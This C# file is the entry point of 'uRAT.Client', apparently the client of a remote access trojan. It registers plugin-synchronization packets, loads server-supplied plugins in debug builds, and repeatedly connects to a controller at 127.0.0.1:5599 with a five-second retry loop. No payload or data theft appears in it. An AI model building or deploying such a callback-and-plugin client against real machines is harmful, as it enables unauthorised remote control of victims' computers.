using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using uRAT.Client.Plugin.Synchronization;
using uRAT.Client.Plugin.Synchronization.Packets;
using uRAT.Client.Tools;
using uRAT.Client.Tools.Blob;

namespace uRAT.Client
{
    class Program
    {
        static void Main(string[] args)
        {

            Console.ReadLine();
            Globals.Client = new uNet2.UNetClient(new StandardPacketProcessor
            {
                PacketTable = new Dictionary<int,Type>
                {
                    {-1, typeof(FetchPluginMetadataPacket)},
                    {-2, typeof(PluginActionPacket)},
                    {-3, typeof(SynchronizationFinalizationPacket)}
                }
            });
            Globals.Client.RegisterOperation<PluginSynchronizationOperation>();

#if DEBUG
            Globals.PluginAggregator = new Plugin.PluginAggregator();
            Globals.Client.OnClientConnected += (o, e) =>
            {
                Globals.PluginAggregator.LoadedPlugins.ForEach(lp =>
                {
                    lp.Plugins.ForEach(lpp =>
                    {
                        lpp.OnClientConnected();
                    });
                });
            };
            Globals.Client.OnPacketReceived += (o, e) =>
            {
                Globals.PluginAggregator.LoadedPlugins.ForEach(lp =>
                {
                    lp.Plugins.ForEach(lpp =>
                    {
                        lpp.OnPacketReceived(o, e);
                    });
                });
            };
            Globals.PluginAggregator.FetchPlugins();
#endif
            Connect();

            Console.ReadLine();
        }

        static void Connect()
        {
            if (!Globals.Client.Connect("127.0.0.1", 5599))
            {
                Thread.Sleep(5000);
                Connect();
            }
        }
    }
}
